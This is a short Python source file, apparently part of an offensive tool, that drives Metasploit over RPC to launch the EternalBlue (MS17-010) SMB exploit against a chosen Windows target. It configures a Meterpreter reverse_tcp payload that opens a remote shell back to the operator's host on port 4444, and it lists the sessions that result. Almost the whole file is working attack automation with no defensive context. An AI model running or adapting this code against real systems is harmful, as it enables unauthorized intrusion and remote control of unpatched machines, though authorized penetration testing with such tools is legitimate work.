from pymetasploit3.msfrpc import MsfRpcClient
import time

class MSFClient:
    def __init__(self, password, port=55552, ssl=False):
        self.password = password
        self.port = port
        self.ssl = ssl
        self.client = None

    def connect(self):
        print("[*] Connecting to MSF RPC...")
        try:
            self.client = MsfRpcClient(self.password, port=self.port, ssl=self.ssl)
            print("[+] Connected to MSF RPC.")
            return True
        except Exception as e:
            print(f"[-] MSF Connection failed: {e}")
            print("    (Ensure msfrpcd is running: msfrpcd -P <password> -S -f)")
            return False

    def execute_eternalblue(self, target, lhost):
        if not self.client:
            return "Client not connected"
        
        print(f"[*] Preparing EternalBlue (MS17-010) for {target}...")
        
        # 1. Get the exploit module
        exploit = self.client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
        
        # 2. Set Options
        exploit['RHOSTS'] = target
        
        # 3. Set Payload (using generic reverse tcp for now, user might need to change)
        payload = self.client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
        payload['LHOST'] = lhost
        payload['LPORT'] = 4444
        
        print(f"[*] Executing exploit against {target} (LHOST={lhost})...")
        
        # 4. Execute
        # 'execute' returns a job ID usually
        job = exploit.execute(payload=payload)
        
        if job and 'job_id' in job:
             print(f"[*] Exploit job started with ID: {job['job_id']}")
             # Wait a bit for session?
             # In a real tool, we'd poll sessions
             return f"Job started: {job['job_id']}"
        else:
             return "Exploit execution failed to start job."

    def check_sessions(self):
        if not self.client:
            return {}
        return self.client.sessions.list
